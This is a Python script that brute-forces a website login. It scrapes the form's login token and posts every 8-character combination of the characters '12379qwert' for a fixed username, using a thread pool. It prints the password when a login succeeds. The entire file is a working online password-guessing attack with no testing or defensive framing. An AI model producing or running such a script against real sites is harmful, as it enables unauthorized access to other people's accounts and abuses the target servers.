import concurrent.futures
import requests
from bs4 import BeautifulSoup
from config import final_cnfg

# Get URL from config
url = final_cnfg["links"]['main_site']
# Start a session
session = requests.Session()

def autorisation(session, username, password, url):
    # Get authorization token
    page = session.get(url)
    soup = BeautifulSoup(page.text, "html.parser")
    logintoken = soup.find('input', {'name': 'logintoken'}).get('value')
    # Attempt login
    post_request = session.post(url, {
        'logintoken': logintoken,
        'username': username,
        'password': password,
    })
    # Check if logged in
    soup = BeautifulSoup(post_request.text, "html.parser")
    return not soup.findAll('div', {'class': 'alert alert-danger', 'role': 'alert'})

string = "12379qwert"
x_min = 8
y_max = 8
username = 's0000'  # Replace with the actual username

def to_dict(string):
    dict = {}
    old_i = string[-1]
    for i in string:
        dict[old_i] = i
        old_i = i
    return dict

dict = to_dict(string)
end = string[-1]

def generate_passwords(length):
    x = [string[0]] * length  # Initialize x with the current length
    attempts = 0
    max_attempts = len(string) ** length  # Calculate the maximum number of attempts

    while attempts < max_attempts:
        password = "".join(x)
        yield password

        for i in range(len(x)):
            if x[i] != end:
                x[i] = dict[x[i]]
                break
            else:
                x[i] = string[0]
                if i == len(x) - 1:
                    x.append(string[0])
                    if len(x) > length:
                        x = [string[0]] * length  # Reset x if it exceeds the current length
                        break

        attempts += 1

def check_password(password):
    return autorisation(session, username, password, url)

found = False
with concurrent.futures.ThreadPoolExecutor() as executor:
    for length in range(x_min, y_max + 1):
        passwords = generate_passwords(length)
        futures = {executor.submit(check_password, pwd): pwd for pwd in passwords}

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                correct_password = futures[future]
                print(f"Correct password found: {correct_password}")
                found = True
                break
        if found:
            break
    else:
        raise ValueError("All possible passwords have been exhausted without finding the correct password.")
